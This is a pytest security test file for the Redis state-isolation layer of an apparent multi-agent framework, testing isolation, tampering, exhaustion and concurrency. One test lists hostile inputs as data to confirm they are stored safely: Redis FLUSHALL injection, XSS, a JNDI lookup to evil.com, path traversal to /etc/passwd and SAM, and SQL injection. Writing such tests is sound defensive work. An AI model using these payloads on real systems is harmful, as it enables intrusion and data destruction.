"""
Security Tests for State Isolation

These tests verify that the state isolation mechanisms are secure and prevent
unauthorized access, data leaks, and other security vulnerabilities.
"""

import pytest
import pytest_asyncio
import asyncio
import uuid
import hashlib
import secrets
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional

from src.infrastructure.state.redis_state_store import RedisStateStore
from src.context.redis_context_manager import RedisContextManager
from src.infrastructure.execution_runtime.redis_execution_tree import RedisExecutionTree
from src.interfaces.state_store import StateSnapshot, StateType, StateQuery
from src.interfaces.context_manager import ContextIsolationLevel, AgentContext
from src.agents.stateful_wrapper import StatefulAgentWrapper
from src.agents.worker import WorkerAgent
from src.agents.base import AgentConfig


@pytest_asyncio.fixture(scope="function")
async def security_setup():
    """Setup for security testing"""
    state_store = RedisStateStore(
        redis_url="redis://redis:6379",
        db=14,
        key_prefix="security_test"
    )
    await state_store.health_check()
    
    context_manager = RedisContextManager(
        redis_url="redis://redis:6379",
        db=14,
        key_prefix="security_test_ctx"
    )
    await context_manager.health_check()
    
    execution_tree = RedisExecutionTree(
        redis_url="redis://redis:6379",
        db=14,
        key_prefix="security_test_tree"
    )
    await execution_tree.health_check()
    
    try:
        yield {
            "state_store": state_store,
            "context_manager": context_manager,
            "execution_tree": execution_tree
        }
    finally:
        import redis.asyncio as redis
        r = redis.from_url("redis://redis:6379/14")
        await r.flushdb()
        await r.aclose()


class TestStateIsolationSecurity:
    """Security tests for state isolation"""
    
    @pytest.mark.asyncio
    async def test_agent_state_isolation(self, security_setup):
        """Test that agents cannot access each other's states"""
        setup = security_setup
        
        # Create two agents with different IDs
        agent1_id = f"secure_agent_1_{uuid.uuid4().hex}"
        agent2_id = f"secure_agent_2_{uuid.uuid4().hex}"
        
        # Save sensitive data for agent1
        sensitive_data = {
            "api_key": "secret_key_12345",
            "password": "confidential_pwd",
            "private_data": {"ssn": "123-45-6789", "credit_card": "1234-5678-9012-3456"}
        }
        
        agent1_state = StateSnapshot(
            agent_id=agent1_id,
            state_type=StateType.AGENT_STATE,
            data=sensitive_data,
            metadata={"security_level": "high"}
        )
        
        await setup["state_store"].save_state(agent1_state)
        
        # Save normal data for agent2
        agent2_state = StateSnapshot(
            agent_id=agent2_id,
            state_type=StateType.AGENT_STATE,
            data={"public_info": "This is public"},
            metadata={"security_level": "low"}
        )
        
        await setup["state_store"].save_state(agent2_state)
        
        # Try to access agent1's state using agent2's ID - should fail
        agent2_states = await setup["state_store"].load_state(
            StateQuery(
                agent_ids=[agent2_id],
                state_types=[StateType.AGENT_STATE]
            )
        )
        
        # Agent2 should only see its own state
        assert len(agent2_states) == 1
        assert agent2_states[0].agent_id == agent2_id
        assert "api_key" not in agent2_states[0].data
        assert "password" not in agent2_states[0].data
        
        # Verify agent1's data is still secure
        agent1_states = await setup["state_store"].load_state(
            StateQuery(
                agent_ids=[agent1_id],
                state_types=[StateType.AGENT_STATE]
            )
        )
        
        assert len(agent1_states) == 1
        assert agent1_states[0].data["api_key"] == "secret_key_12345"
    
    @pytest.mark.asyncio
    async def test_context_isolation_security(self, security_setup):
        """Test context isolation prevents unauthorized access"""
        setup = security_setup
        
        # Create parent context with sensitive data
        parent_context = await setup["context_manager"].create_context(
            agent_id="parent_secure_agent",
            isolation_level=ContextIsolationLevel.SHALLOW,
            variables={
                "database_password": "super_secret_db_pwd",
                "api_credentials": {
                    "key": "restricted_api_key",
                    "secret": "restricted_api_secret"
                },
                "encryption_key": secrets.token_hex(32)
            },
            shared_resources={
                "production_db": "postgres://prod_db:5432",
                "payment_gateway": "https://payment.api/v1"
            },
            constraints={
                "max_queries": 1000,
                "allowed_ips": ["10.0.0.1", "10.0.0.2"]
            }
        )
        
        # Test different isolation levels
        
        # 1. SANDBOXED - Should have NO access to parent data
        sandboxed_context = await setup["context_manager"].fork_context(
            parent_context_id=parent_context,
            child_agent_id="sandboxed_agent"
        )
        
        sandboxed_data = await setup["context_manager"].get_context(sandboxed_context)
        assert "database_password" not in sandboxed_data.variables
        assert "api_credentials" not in sandboxed_data.variables
        assert "encryption_key" not in sandboxed_data.variables
        assert sandboxed_data.shared_resources == {}
        assert sandboxed_data.constraints == {}
        
        # 2. DEEP - Should have copies but isolated
        deep_context = await setup["context_manager"].fork_context(
            parent_context_id=parent_context,
            child_agent_id="deep_isolated_agent"
        )
        
        deep_data = await setup["context_manager"].get_context(deep_context)
        # In DEEP isolation, data is copied but changes don't affect parent
        
        # Modify child context
        deep_data.variables["database_password"] = "hacked_password"
        await setup["context_manager"].update_context(
            deep_context,
            {"database_password": "hacked_password"}
        )
        
        # Parent should be unaffected
        parent_data = await setup["context_manager"].get_context(parent_context)
        assert parent_data.variables["database_password"] == "super_secret_db_pwd"
        
        # 3. Test unauthorized context access
        fake_context_id = "fake_context_" + uuid.uuid4().hex
        unauthorized_context = await setup["context_manager"].get_context(fake_context_id)
        assert unauthorized_context is None
    
    @pytest.mark.asyncio
    async def test_execution_tree_security(self, security_setup):
        """Test execution tree access control"""
        setup = security_setup
        
        # Create two separate execution trees
        tree1_id = await setup["execution_tree"].create_tree(
            root_name="secure_workflow_1",
            metadata={"owner": "user1", "classification": "confidential"}
        )
        
        tree2_id = await setup["execution_tree"].create_tree(
            root_name="secure_workflow_2",
            metadata={"owner": "user2", "classification": "public"}
        )
        
        # Add sensitive node to tree1
        from src.core.execution_tree import ExecutionNode, NodeType, ExecutionStatus
        
        sensitive_node = ExecutionNode(
            name="process_payment",
            node_type=NodeType.SUB_AGENT,
            status=ExecutionStatus.PENDING,
            agent_id="payment_processor",
            task_data={
                "credit_card": "1234-5678-9012-3456",
                "amount": 1000.00,
                "currency": "USD"
            },
            metadata={"pci_compliant": True}
        )
        
        await setup["execution_tree"].add_node(tree1_id, sensitive_node)
        
        # Add normal node to tree2
        normal_node = ExecutionNode(
            name="send_notification",
            node_type=NodeType.SUB_AGENT,
            status=ExecutionStatus.PENDING,
            agent_id="notifier",
            task_data={"message": "Task completed"},
            metadata={"priority": "low"}
        )
        
        await setup["execution_tree"].add_node(tree2_id, normal_node)
        
        # Verify tree isolation
        tree1_snapshot = await setup["execution_tree"].get_tree_snapshot(tree1_id)
        tree2_snapshot = await setup["execution_tree"].get_tree_snapshot(tree2_id)
        
        # Each tree should only see its own nodes
        assert len(tree1_snapshot.nodes) == 2  # Root + sensitive node
        assert len(tree2_snapshot.nodes) == 2  # Root + normal node
        
        # Verify sensitive data is in tree1
        payment_nodes = [n for n in tree1_snapshot.nodes.values() 
                        if n.name == "process_payment"]
        assert len(payment_nodes) == 1
        assert payment_nodes[0].task_data["credit_card"] == "1234-5678-9012-3456"
        
        # Verify tree2 has no access to sensitive data
        tree2_node_names = {n.name for n in tree2_snapshot.nodes.values()}
        assert "process_payment" not in tree2_node_names
    
    @pytest.mark.asyncio
    async def test_state_tampering_protection(self, security_setup):
        """Test protection against state tampering"""
        setup = security_setup
        
        # Create agent with integrity checking
        agent_id = f"tamper_protected_agent_{uuid.uuid4().hex}"
        
        # Original state with checksum
        original_data = {
            "balance": 1000.00,
            "transactions": [
                {"id": 1, "amount": 100, "type": "credit"},
                {"id": 2, "amount": 50, "type": "debit"}
            ]
        }
        
        # Calculate integrity hash
        data_str = str(sorted(original_data.items()))
        integrity_hash = hashlib.sha256(data_str.encode()).hexdigest()
        
        state = StateSnapshot(
            agent_id=agent_id,
            state_type=StateType.AGENT_STATE,
            data=original_data,
            metadata={"integrity_hash": integrity_hash, "version": 1}
        )
        
        await setup["state_store"].save_state(state)
        
        # Simulate tampering attempt
        # In a real attack, someone might try to modify the balance directly
        
        # Load state and verify integrity
        loaded_state = await setup["state_store"].get_latest_state(
            agent_id, StateType.AGENT_STATE
        )
        
        # Recalculate hash
        loaded_data_str = str(sorted(loaded_state.data.items()))
        calculated_hash = hashlib.sha256(loaded_data_str.encode()).hexdigest()
        
        # Verify integrity
        assert calculated_hash == loaded_state.metadata["integrity_hash"]
        assert loaded_state.data["balance"] == 1000.00
        
        # Test versioning prevents rollback attacks
        # Save new version
        new_data = original_data.copy()
        new_data["balance"] = 950.00  # After debit
        
        new_data_str = str(sorted(new_data.items()))
        new_integrity_hash = hashlib.sha256(new_data_str.encode()).hexdigest()
        
        new_state = StateSnapshot(
            agent_id=agent_id,
            state_type=StateType.AGENT_STATE,
            data=new_data,
            metadata={"integrity_hash": new_integrity_hash, "version": 2}
        )
        
        await setup["state_store"].save_state(new_state)
        
        # Latest state should be version 2
        latest_state = await setup["state_store"].get_latest_state(
            agent_id, StateType.AGENT_STATE
        )
        assert latest_state.metadata["version"] == 2
        assert latest_state.data["balance"] == 950.00
    
    @pytest.mark.asyncio
    async def test_injection_attack_prevention(self, security_setup):
        """Test prevention of injection attacks"""
        setup = security_setup
        
        # Test various injection attempts
        injection_attempts = [
            # Redis command injection
            "'; FLUSHALL; --",
            "*3\r\n$3\r\nDEL\r\n$1\r\n*\r\n",
            
            # Script injection
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style
            
            # Path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            
            # SQL injection (even though we use Redis)
            "' OR '1'='1",
            "1; DROP TABLE users; --"
        ]
        
        for injection in injection_attempts:
            # Try to use injection as agent ID
            agent_id = f"agent_{injection}"
            
            # State store should handle this safely
            state = StateSnapshot(
                agent_id=agent_id,
                state_type=StateType.AGENT_STATE,
                data={"test": "injection_prevention"},
                metadata={"injection_test": injection}
            )
            
            # Save should work (data is escaped/encoded)
            result = await setup["state_store"].save_state(state)
            assert result is True
            
            # Retrieve should return exact data (no execution)
            loaded = await setup["state_store"].get_latest_state(
                agent_id, StateType.AGENT_STATE
            )
            assert loaded is not None
            assert loaded.agent_id == agent_id
            assert loaded.metadata["injection_test"] == injection
            
            # No side effects should occur
            health = await setup["state_store"].health_check()
            assert health["status"] == "healthy"
    
    @pytest.mark.asyncio
    async def test_resource_exhaustion_protection(self, security_setup):
        """Test protection against resource exhaustion attacks"""
        setup = security_setup
        
        # Test 1: Prevent excessive memory usage
        agent_id = "resource_test_agent"
        
        # Try to save extremely large state
        large_data = "x" * (10 * 1024 * 1024)  # 10MB string
        
        huge_state = StateSnapshot(
            agent_id=agent_id,
            state_type=StateType.AGENT_STATE,
            data={"huge_field": large_data},
            metadata={"size_mb": 10}
        )
        
        # Should handle large data appropriately
        # In production, there would be size limits
        try:
            await setup["state_store"].save_state(huge_state)
            # If it succeeds, verify we can retrieve it
            loaded = await setup["state_store"].get_latest_state(
                agent_id, StateType.AGENT_STATE
            )
            assert loaded is not None
        except Exception as e:
            # If there are size limits, it should fail gracefully
            assert "size" in str(e).lower() or "memory" in str(e).lower()
        
        # Test 2: Prevent excessive number of operations
        async def spam_operations():
            tasks = []
            for i in range(1000):  # Try to create 1000 concurrent operations
                state = StateSnapshot(
                    agent_id=f"spam_agent_{i}",
                    state_type=StateType.AGENT_STATE,
                    data={"index": i},
                    metadata={}
                )
                tasks.append(setup["state_store"].save_state(state))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            return results
        
        # Should handle burst of operations
        results = await spam_operations()
        
        # Most should succeed, but system should remain stable
        successful = sum(1 for r in results if r is True)
        assert successful > 0  # At least some should succeed
        
        # System should still be healthy
        health = await setup["state_store"].health_check()
        assert health["status"] == "healthy"
    
    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self, security_setup):
        """Test resistance to timing attacks"""
        setup = security_setup
        
        # Create agents with different data sizes
        agents = []
        for i in range(5):
            agent_id = f"timing_test_agent_{i}"
            data_size = (i + 1) * 100  # Increasing data sizes
            
            state = StateSnapshot(
                agent_id=agent_id,
                state_type=StateType.AGENT_STATE,
                data={"data": "x" * data_size, "secret": f"secret_{i}"},
                metadata={"size": data_size}
            )
            
            await setup["state_store"].save_state(state)
            agents.append(agent_id)
        
        # Measure query times
        import time
        query_times = []
        
        for agent_id in agents:
            start = time.time()
            state = await setup["state_store"].get_latest_state(
                agent_id, StateType.AGENT_STATE
            )
            end = time.time()
            query_times.append(end - start)
        
        # Times should be relatively consistent (not leak info about data size)
        # In practice, this would use constant-time operations
        avg_time = sum(query_times) / len(query_times)
        max_deviation = max(abs(t - avg_time) for t in query_times)
        
        # Deviation should be small (allowing for normal variance)
        assert max_deviation < 0.1  # Less than 100ms deviation
    
    @pytest.mark.asyncio
    async def test_concurrent_access_security(self, security_setup):
        """Test security under concurrent access"""
        setup = security_setup
        
        # Shared resource that agents will try to modify
        shared_resource_id = "shared_bank_account"
        initial_balance = 1000.00
        
        # Initialize shared state
        initial_state = StateSnapshot(
            agent_id=shared_resource_id,
            state_type=StateType.AGENT_STATE,
            data={"balance": initial_balance, "transactions": []},
            metadata={"locked": False}
        )
        
        await setup["state_store"].save_state(initial_state)
        
        # Multiple agents trying to withdraw concurrently
        async def attempt_withdrawal(agent_id: str, amount: float):
            # In a real system, this would use proper locking
            
            # Read current state
            current = await setup["state_store"].get_latest_state(
                shared_resource_id, StateType.AGENT_STATE
            )
            
            if current and current.data["balance"] >= amount:
                # Simulate processing delay
                await asyncio.sleep(0.01)
                
                # Try to update
                new_balance = current.data["balance"] - amount
                new_transactions = current.data["transactions"] + [
                    {"agent": agent_id, "amount": -amount, "time": datetime.utcnow().isoformat()}
                ]
                
                new_state = StateSnapshot(
                    agent_id=shared_resource_id,
                    state_type=StateType.AGENT_STATE,
                    data={"balance": new_balance, "transactions": new_transactions},
                    metadata={"last_updated_by": agent_id}
                )
                
                return await setup["state_store"].save_state(new_state)
            
            return False
        
        # Create concurrent withdrawal attempts
        withdrawal_tasks = []
        for i in range(10):
            agent_id = f"concurrent_agent_{i}"
            amount = 200.00  # Each trying to withdraw 200
            withdrawal_tasks.append(attempt_withdrawal(agent_id, amount))
        
        results = await asyncio.gather(*withdrawal_tasks)
        
        # Check final state
        final_state = await setup["state_store"].get_latest_state(
            shared_resource_id, StateType.AGENT_STATE
        )
        
        # Balance should never go negative
        assert final_state.data["balance"] >= 0
        
        # Should not allow more withdrawals than balance permits
        total_withdrawn = initial_balance - final_state.data["balance"]
        assert total_withdrawn <= initial_balance
        
        # Transaction count should match successful withdrawals
        assert len(final_state.data["transactions"]) == int(total_withdrawn / 200.00)


class TestAgentIsolationSecurity:
    """Test security of agent isolation mechanisms"""
    
    @pytest.mark.asyncio
    async def test_agent_process_isolation(self, security_setup):
        """Test that agents run in isolated processes/contexts"""
        setup = security_setup
        
        # Create two agents that should be isolated
        config1 = AgentConfig(
            name="isolated_agent_1",
            agent_type="worker",
            timeout=60
        )
        
        config2 = AgentConfig(
            name="isolated_agent_2",
            agent_type="worker",
            timeout=60
        )
        
        agent1 = WorkerAgent(config1)
        agent2 = WorkerAgent(config2)
        
        # Wrap with state management
        stateful_agent1 = StatefulAgentWrapper(
            wrapped_agent=agent1,
            state_store=setup["state_store"],
            context_manager=setup["context_manager"],
            execution_tree=setup["execution_tree"]
        )
        
        stateful_agent2 = StatefulAgentWrapper(
            wrapped_agent=agent2,
            state_store=setup["state_store"],
            context_manager=setup["context_manager"],
            execution_tree=setup["execution_tree"]
        )
        
        # Create isolated contexts
        context1 = await setup["context_manager"].create_context(
            agent_id=stateful_agent1.id,
            isolation_level=ContextIsolationLevel.SANDBOXED,
            variables={"secret": "agent1_secret"},
            constraints={"memory_limit_mb": 512}
        )
        
        context2 = await setup["context_manager"].create_context(
            agent_id=stateful_agent2.id,
            isolation_level=ContextIsolationLevel.SANDBOXED,
            variables={"secret": "agent2_secret"},
            constraints={"memory_limit_mb": 512}
        )
        
        # Agents should not be able to access each other's contexts
        # This would be enforced at the process/container level in production
        
        # Verify context isolation
        ctx1_data = await setup["context_manager"].get_context(context1)
        ctx2_data = await setup["context_manager"].get_context(context2)
        
        assert ctx1_data.variables["secret"] == "agent1_secret"
        assert ctx2_data.variables["secret"] == "agent2_secret"
        
        # One agent's context should not contain the other's data
        assert "agent2_secret" not in str(ctx1_data.variables)
        assert "agent1_secret" not in str(ctx2_data.variables)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
